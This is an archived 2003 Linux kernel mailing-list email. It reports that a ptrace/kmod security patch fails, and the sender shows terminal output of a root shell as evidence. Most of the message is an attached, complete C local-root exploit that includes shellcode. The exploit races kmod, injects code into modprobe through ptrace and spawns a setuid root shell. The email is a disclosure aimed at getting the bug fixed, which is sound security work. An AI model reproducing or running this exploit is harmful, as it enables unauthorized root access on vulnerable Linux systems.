Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261270AbTEJUrx (ORCPT <rfc822;willy@w.ods.org>);
	Sat, 10 May 2003 16:47:53 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S264499AbTEJUrw
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sat, 10 May 2003 16:47:52 -0400
Received: from polaris.galacticasoftware.com ([206.45.95.222]:7808 "EHLO
	polaris.galacticasoftware.com") by vger.kernel.org with ESMTP
	id S261270AbTEJUrm (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Sat, 10 May 2003 16:47:42 -0400
From: Adam Majer <adamm@galacticasoftware.com>
Date: Sat, 10 May 2003 15:52:49 -0500
To: Bernhard Kaindl <bk@suse.de>
Cc: linux-kernel@vger.kernel.org, Marcelo Tosatti <marcelo@conectiva.com.br>
Subject: ptrace secfix does NOT work... :(
Message-ID: <20030510205249.GA1179@galacticasoftware.com>
References: <Pine.LNX.4.44.0305082310230.12720-200000@wotan.suse.de>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="NDin8bjvE/0mNLFQ"
Content-Disposition: inline
In-Reply-To: <Pine.LNX.4.44.0305082310230.12720-200000@wotan.suse.de>
User-Agent: Mutt/1.3.28i
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


--NDin8bjvE/0mNLFQ
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Fri, May 09, 2003 at 12:05:52AM +0200, Bernhard Kaindl wrote:
> Hello,
>=20
> The attached patch cleans up the too restrictive checks which were
> included in the original ptrace/kmod secfix posted by Alan Cox
> and applies on top of a clean 2.4.20-rc1 source tree.

But the ptrace hole is _NOT_ fixed... :(

adamm@polaris:~/test$ uname -r
2.4.21-rc2
\u@\h:\w\$ ls -ltr hehe
-rw-------    1 root     root           17 May 10 15:44 hehe
\u@\h:\w\$ whoami
root
\u@\h:\w\$ cat hehe
I can see you!!
                                                                           =
                                  =20
\u@\h:\w\$ rm hehh
\u@\h:\w\$ ls -ltr hehe
ls: hehe: No such file or directory

I'm attaching the exploit so someone can fix the bug properly.
I could get root even with the patched 2.4.20 so I don't think
that this is the fault of the your patch.

- Adam

--NDin8bjvE/0mNLFQ
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="test.c"
Content-Transfer-Encoding: quoted-printable

/*
 * Linux kernel ptrace/kmod local root exploit
 *
 * This code exploits a race condition in kernel/kmod.c, which creates
 * kernel thread in insecure manner. This bug allows to ptrace cloned
 * process, allowing to take control over privileged modprobe binary.
 *
 * Should work under all current 2.2.x and 2.4.x kernels.
 *
 * I discovered this stupid bug independently on January 25, 2003, that
 * is (almost) two month before it was fixed and published by Red Hat
 * and others.
 *
 * Wojciech Purczynski <cliph@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 *
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <grp.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <paths.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <linux/user.h>

char cliphcode[] =3D
  "\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
  "\x00\x5b\x31\xc9\x89\xca\xcd\x80"
  "\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
  "\x00\x00\xcd\x80\x89\xd0\x89\xd3"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff";

#define CODE_SIZE (sizeof(cliphcode) - 1)

pid_t parent =3D 1;
pid_t child =3D 1;
pid_t victim =3D 1;
volatile int gotchild =3D 0;

void fatal(char * msg)
{
  perror(msg);
  kill(parent, SIGKILL);
  kill(child, SIGKILL);
  kill(victim, SIGKILL);
}

void putcode(unsigned long * dst)
{
  char buf[MAXPATHLEN + CODE_SIZE];
  unsigned long * src;
  int i, len;

  memcpy(buf, cliphcode, CODE_SIZE);
  len =3D readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
  if (len =3D=3D -1)
    fatal("[-] Unable to read /proc/self/exe");

  len +=3D CODE_SIZE + 1;
  buf[len] =3D '\0';
 =20
  src =3D (unsigned long*) buf;
  for (i =3D 0; i < len; i +=3D 4)
    if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) =3D=3D -1)
      fatal("[-] Unable to write shellcode");
}

void sigchld(int signo)
{
  struct user_regs_struct regs;

  if (gotchild++ =3D=3D 0)
    return;
 =20
  fprintf(stderr, "[+] Signal caught\n");

  if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) =3D=3D -1)
    fatal("[-] Unable to read registers");
 =20
  fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
 =20
  putcode((unsigned long *)regs.eip);

  fprintf(stderr, "[+] Now wait for suid shell...\n");

  if (ptrace(PTRACE_DETACH, victim, 0, 0) =3D=3D -1)
    fatal("[-] Unable to detach from victim");

  exit(0);
}

void sigalrm(int signo)
{
  errno =3D ECANCELED;
  fatal("[-] Fatal error");
}

void do_child(void)
{
  int err;

  child =3D getpid();
  victim =3D child + 1;

  signal(SIGCHLD, sigchld);

  do
    err =3D ptrace(PTRACE_ATTACH, victim, 0, 0);
  while (err =3D=3D -1 && errno =3D=3D ESRCH);

  if (err =3D=3D -1)
    fatal("[-] Unable to attach");

  fprintf(stderr, "[+] Attached to %d\n", victim);
  while (!gotchild) ;
  if (ptrace(PTRACE_SYSCALL, victim, 0, 0) =3D=3D -1)
    fatal("[-] Unable to setup syscall trace");
  fprintf(stderr, "[+] Waiting for signal\n");

  for(;;);
}

void do_parent(char * progname)
{
  struct stat st;
  int err;
  errno =3D 0;
  socket(AF_SECURITY, SOCK_STREAM, 1);
  do {
    err =3D stat(progname, &st);
  } while (err =3D=3D 0 && (st.st_mode & S_ISUID) !=3D S_ISUID);
 =20
  if (err =3D=3D -1)
    fatal("[-] Unable to stat myself");

  alarm(0);
  system(progname);
}

void prepare(void)
{
  if (geteuid() =3D=3D 0) {
    initgroups("root", 0);
    setgid(0);
    setuid(0);
    execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
    fatal("[-] Unable to spawn shell");
  }
}

int main(int argc, char ** argv)
{
  prepare();
  signal(SIGALRM, sigalrm);
  alarm(10);
 =20
  parent =3D getpid();
  child =3D fork();
  victim =3D child + 1;
 =20
  if (child =3D=3D -1)
    fatal("[-] Unable to fork");

  if (child =3D=3D 0)
    do_child();
  else
    do_parent(argv[0]);

  return 0;
}

--NDin8bjvE/0mNLFQ--
